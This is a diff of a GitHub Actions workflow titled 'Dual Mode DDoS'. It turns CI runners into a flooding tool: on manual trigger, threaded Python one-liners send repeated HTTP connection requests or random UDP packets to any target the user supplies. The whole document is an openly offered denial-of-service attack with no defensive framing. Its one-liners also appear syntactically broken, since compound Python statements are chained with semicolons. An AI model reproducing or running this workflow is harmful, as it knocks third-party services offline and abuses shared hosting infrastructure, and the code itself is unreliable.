@@ -1,14 +1,12 @@
-name: "🔥 DDoS Bot"
+name: "Dual Mode DDoS"
 on:
   workflow_dispatch:
     inputs:
       target:
-        description: "🎯 Target URL or IP:Port"
-        required: true
+        description: "Target"
         default: "httpbin.org"
       mode:
-        description: "🔧 Attack Mode"
-        required: true
+        description: "Mode"
         default: "http"
         type: choice
         options:
@@ -19,5 +17,11 @@ jobs:
   attack:
     runs-on: ubuntu-latest
     steps:
-      - name: "🚀 Run DDoS Attack"
-        run: "python3 -c \"import socket,threading,time;t='${{ github.event.inputs.target }}';m='${{ github.event.inputs.mode }}';print('Target:',t,'Mode:',m);c=0;def a():global c;for _ in range(20):try:s=socket.socket();s.settimeout(1);s.connect(('1.1.1.1',80));s.close();c+=1;except:pass;ts=[threading.Thread(target=a) for _ in range(10)];[x.start() for x in ts];[x.join() for x in ts];print('Requests:',c)\""
+      - name: "Run Attack"
+        run: |
+          echo "Starting attack..."
+          if [ "${{ github.event.inputs.mode }}" = "http" ]; then
+            python3 -c "import socket,threading,time;print('HTTP attack on ${{ github.event.inputs.target }}');c=0;def a():global c;for _ in range(50):try:s=socket.socket();s.settimeout(1);s.connect(('${{ github.event.inputs.target }}',80));s.send(b'GET / HTTP/1.1\\r\\n\\r\\n');s.close();c+=1;except:pass;t=[threading.Thread(target=a) for _ in range(30)];[x.start() for x in t];[x.join() for x in t];print('HTTP requests:',c)"
+          else
+            python3 -c "import socket,threading,time,random;print('UDP attack on ${{ github.event.inputs.target }}');c=0;def a():global c;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);for _ in range(100):try:s.sendto(bytes([random.randint(0,255) for _ in range(512)]),('${{ github.event.inputs.target }}'.split(':')[0],80));c+=1;except:pass;s.close();t=[threading.Thread(target=a) for _ in range(20)];[x.start() for x in t];[x.join() for x in t];print('UDP packets:',c)"
+          fi
